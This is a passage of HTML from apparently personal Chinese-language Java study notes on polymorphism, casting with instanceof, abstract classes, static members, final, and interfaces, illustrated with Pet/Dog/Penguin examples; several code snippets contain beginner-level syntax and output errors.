class="headerlink" title="多态"></a>多态</h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><p>多态&#x3D;继承+重写</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b79aa41.png" alt="image-20240417165136599"></p><p>多态表现形式：调用父类的方法，执行子类的方法</p><p>这里是<strong>向上转型</strong></p><h3 id="多态的应用"><a href="#多态的应用" class="headerlink" title="多态的应用"></a>多态的应用</h3><p><strong>1.使用父类作为方法形参实现多态，使方法参数的类型更为宽泛</strong></p><p>代码与前面的相结合一下 这里只写重点代码了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">character</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feed</span><span class="params">(Pet)</span>&#123;</span><br><span class="line">        pet.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">character</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">character</span>();</span><br><span class="line">        m.feed(<span class="keyword">new</span> <span class="title class_">Dog</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.使用父类作为方法返回值实现多态，使方法可以返回不同子类对象</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">character</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feed</span><span class="params">(pet)</span>&#123;</span><br><span class="line">        pet.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Pet <span class="title function_">getPet</span><span class="params">(String type)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(type.equals(<span class="string">&quot;cat&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Penguin</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">character</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">character</span>();</span><br><span class="line">        <span class="type">Pet</span> <span class="variable">pet</span> <span class="operator">=</span> m.getPet(<span class="string">&quot;Dog&quot;</span>);</span><br><span class="line">        m.feed(<span class="keyword">new</span> <span class="title class_">Dog</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="向下转型-拆箱"><a href="#向下转型-拆箱" class="headerlink" title="向下转型(拆箱)"></a>向下转型(拆箱)</h3><blockquote><p>一个对象在调用方法的时候，能调用到哪些方法取决于对象的类型</p><p>执行方法的时候，执行哪个方法取决于实际类型</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">character</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feed</span><span class="params">(pet)</span>&#123;</span><br><span class="line">        pet.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">play</span><span class="params">(Pet pet)</span>&#123;</span><br><span class="line">        Dog dog=(Dog)pet;</span><br><span class="line">        dog.catchDisk();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Pet <span class="title function_">getPet</span><span class="params">(String type)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(type.equals(<span class="string">&quot;cat&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Penguin</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">character</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">character</span>();</span><br><span class="line">        <span class="type">Pet</span> <span class="variable">pet</span> <span class="operator">=</span> m.getPet(<span class="string">&quot;Dog&quot;</span>);</span><br><span class="line">        m.feed(<span class="keyword">new</span> <span class="title class_">Dog</span>());</span><br><span class="line">        m.play(Pet);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Dog dog&#x3D;(Dog)pet;</p><p>将父类引用中的子类对象，强制转回子类本身类型，称为<strong>向下转型</strong></p><p><strong>只要转回子类真实类型，才可调用子类独有的属性和方法</strong></p><p>向下转型时，如果父类引用中的子类对象类型和目标类型不匹配，则会发生类型转换异常（classCastException）</p><p>解决：</p><p>判断传来的是什么</p><p><strong>instanceof</strong>关键字</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">character</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feed</span><span class="params">(pet)</span>&#123;</span><br><span class="line">        pet.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">play</span><span class="params">(Pet pet)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(pet <span class="keyword">instanceof</span> Dog)&#123;</span><br><span class="line">            Dog dog=(Dog)pet;</span><br><span class="line">            dog.catchDisk();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Penguin</span> <span class="variable">p</span> <span class="operator">=</span>(Penguin) pet;</span><br><span class="line">            p.swim();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Pet <span class="title function_">getPet</span><span class="params">(String type)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(type.equals(<span class="string">&quot;cat&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Penguin</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">character</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">character</span>();</span><br><span class="line">        <span class="type">Pet</span> <span class="variable">pet</span> <span class="operator">=</span> m.getPet(<span class="string">&quot;Dog&quot;</span>);</span><br><span class="line">        m.feed(<span class="keyword">new</span> <span class="title class_">Dog</span>());</span><br><span class="line">        m.play(Pet);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向下转型前，应先判断引用中对象真实类型，保证类型转换的正确性</p><h2 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h2><h3 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>abstract 抽象</p><p>这是上面写的Pet类 并加上了abstract</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> health;</span><br><span class="line">    <span class="type">int</span> love;<span class="comment">//亲密度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot; is eating&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;-&quot;</span>+health+<span class="string">&quot;-&quot;</span>+love);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHealth</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHealth</span><span class="params">(<span class="type">int</span> health)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.health=health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLove</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLove</span><span class="params">(<span class="type">int</span> love)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.love=love;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这个Pet是一个抽象出来的类 所以它不能被实例化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pet pet=new Pet();  //这样不行 只能new Dog()这种</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b8206ba.png" alt="image-20240421195056419"></p><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>那抽象类的作用是什么呢</p><blockquote><p>1.可被子类继承</p><p>2.可声明为引用</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a4b83f4d4.png" alt="image-20240421195716373"></p><h4 id="抽象方法"><a href="#抽象方法" class="headerlink" title="抽象方法"></a>抽象方法</h4><p>在抽象类中 只用声明这个方法就行 具体实现在子类中(必须 若这个子类不是抽象的化 抽象的化就会让子类的子类来实现)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> health;</span><br><span class="line">    <span class="type">int</span> love;<span class="comment">//亲密度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>；<span class="comment">//将eat方法抽象</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;-&quot;</span>+health+<span class="string">&quot;-&quot;</span>+love);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHealth</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHealth</span><span class="params">(<span class="type">int</span> health)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.health=health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLove</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLove</span><span class="params">(<span class="type">int</span> love)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.love=love;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>抽象方法必须放在抽象类中(或接口中)</strong></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b8612e7.png" alt="image-20240421200629629"></p><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>静态</p><p><strong>实例属性：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myclass</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Myclass</span> <span class="variable">mc1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myclass</span>();</span><br><span class="line">      mc1.a = <span class="number">10</span>;</span><br><span class="line">      <span class="type">Myclass</span> <span class="variable">mc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myclass</span>();</span><br><span class="line">      mc2.a = <span class="number">20</span>;</span><br><span class="line">      System.out.println(mc1.a+<span class="string">&quot;---&quot;</span>+mc2.a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//10---20</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b7d302e.png" alt="image-20240421201723788"></p><p><strong>静态属性：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myclass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> a;<span class="comment">//这里将a变为静态属性</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Myclass</span> <span class="variable">mc1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myclass</span>();</span><br><span class="line">      mc1.a = <span class="number">100</span>;</span><br><span class="line">      <span class="type">Myclass</span> <span class="variable">mc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myclass</span>();</span><br><span class="line">      mc2.a = <span class="number">200</span>;</span><br><span class="line">      System.out.println(mc1.a+<span class="string">&quot;---&quot;</span>+mc2.a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//20---20</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b7f31fa.png" alt="image-20240421202112564"></p><p>注意 这里用<code>mc1.b</code>来调用实际上警告了的(java中) 因为b实际上是在类中 该用<code>Myclass.b</code>来调用</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b394ed2.png" alt="image-20240421202445371"></p><p>这里可以通过静态变量来统计类对象被创建了多少词</p><h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myclass</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;M1&quot;</span>);</span><br><span class="line">        m2();<span class="comment">//静态方法之间可以直接调用</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Myclass</span>().m3();<span class="comment">//非静态方法要实例化对象调用</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m2</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;M2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">m3</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;M2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//      Myclass mc1 = new Myclass();</span></span><br><span class="line"><span class="comment">//      mc1.a = 10;</span></span><br><span class="line"><span class="comment">//      Myclass mc2 = new Myclass();</span></span><br><span class="line"><span class="comment">//      mc2.a = 20;</span></span><br><span class="line"><span class="comment">//      System.out.println(mc1.a+&quot;---&quot;+mc2.a);</span></span><br><span class="line">      Myclass.m1();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//m1 m2 m3</span></span><br></pre></td></tr></table></figure><p>在静态方法中不能用this super</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4af96103.png" alt="image-20240421203443385"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b2c3f69.png" alt="image-20240421203603070"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myclass</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;M1&quot;</span>);</span><br><span class="line">        m2();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m2</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;M2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">m3</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;M2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//      Myclass mc1 = new Myclass();</span></span><br><span class="line"><span class="comment">//      mc1.a = 10;</span></span><br><span class="line"><span class="comment">//      Myclass mc2 = new Myclass();</span></span><br><span class="line"><span class="comment">//      mc2.a = 20;</span></span><br><span class="line"><span class="comment">//      System.out.println(mc1.a+&quot;---&quot;+mc2.a);</span></span><br><span class="line"><span class="comment">//      Myclass.m1();</span></span><br><span class="line">      <span class="type">Myclass</span> <span class="variable">mc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SubClass</span>();</span><br><span class="line">      mc.m1();</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      如果这里是</span></span><br><span class="line"><span class="comment">      SubClass mc = new SubClass();</span></span><br><span class="line"><span class="comment">      mc.m1();</span></span><br><span class="line"><span class="comment">      结果：sub-m1   隐藏 不重写</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      SubClass.m1();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubClass</span> <span class="keyword">extends</span> <span class="title class_">Myclass</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sub-m1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        没有这里方法的时候会输出：</span></span><br><span class="line"><span class="comment">        m1 m2 m3</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sub-m1(SubClass.m1();)</span></span><br><span class="line"><span class="comment">//m1 m2 m3(mc.m1();)</span></span><br></pre></td></tr></table></figure><h4 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h4><p><img src="https://bu.dusays.com/2024/05/13/6641a4b555f6d.png" alt="image-20240421204829368"></p><p>反射时会主动加载</p><h4 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h4><p>静态代码块会优先于类 构造方法之类的先执行 一般用于初始化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myclass</span> &#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">888</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(<span class="string">&quot;static block&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Myclass</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//888</span></span><br><span class="line"><span class="comment">//static block</span></span><br><span class="line"><span class="comment">//先加载静态属性 再加载静态代码块 new多次也只会执行一次(已经加载了)</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b85d6d0.png" alt="image-20240421205735924"></p><h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p><img src="https://bu.dusays.com/2024/05/13/6641a4ae92422.png" alt="image-20240421210000010"></p><blockquote><p>final修饰类：此类不能被继承</p><p>final修饰方法：此方法不能被覆盖</p><p>final修饰变量：此变量不能被改变(常量)</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a4b695b02.png" alt="image-20240421210720496"></p><p>普通常量：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b818685.png" alt="image-20240421210752719"></p><p>静态常量：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b7a42de.png" alt="image-20240421210904529"></p><p>对象常量：</p><p>常量是一个对象</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b6ce233.png" alt="image-20240421211244107"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5eaf84.png" alt="image-20240421211307746"></p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>接口相当于特殊的抽象类，定义方法、组成部分与抽象类类似</p><p>interface</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MyInterface</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD=<span class="string">&quot;value&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">m2</span><span class="params">()</span>;<span class="comment">//默认public abstract</span></span><br><span class="line">    <span class="type">double</span> VERSION=<span class="number">1.0</span>;<span class="comment">//默认public static final</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jdk8以前：</p><p>接口中只能写：</p><blockquote><p>1.公开静态常量</p><p>2.公开抽象方法</p></blockquote><p>接口的使用：</p><p>接口相当于一个抽象父类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MyInterface</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD=<span class="string">&quot;value&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">m2</span><span class="params">()</span>;<span class="comment">//默认public abstract</span></span><br><span class="line">    <span class="type">double</span> VERSION=<span class="number">1.0</span>;<span class="comment">//默认public static final</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SubTest</span> <span class="keyword">implements</span> <span class="title class_">MyInterface</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sub-M1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">SubTest</span> <span class="variable">sub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SubTest</span>();</span><br><span class="line">        sub.m1();</span><br><span class="line"></span><br><span class="line">        <span class="type">MyInterface</span> <span class="variable">sub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SubTest</span>();</span><br><span class="line">        sub.m1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sub-M1  sub-M1</span></span><br></pre></td></tr></table></figure><p>与抽象类的异同：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b48c41c.png" alt="image-20240421212931162"></p><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5528ae.png" alt="image-20240421213834570"></p> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICode</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">code</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IPlay</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">play</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">IPlay</span>,ICode&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">code</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;会编码&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">play</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;弹钢琴&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">    s.code();</span><br><span class="line">    s.play();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口的规范"><a href="#接口的规范" class="headerlink" title="接口的规范"></a>接口的规范</h3><ul><li>任何类在实现接口时，必须实现接口中所有的抽象方法，否则此类为抽象类</li><li>实现接口中的抽象方法时，访问修饰符必须时public</li></ul><h3 id="接口引用"><a href="#接口引用" class="headerlink" 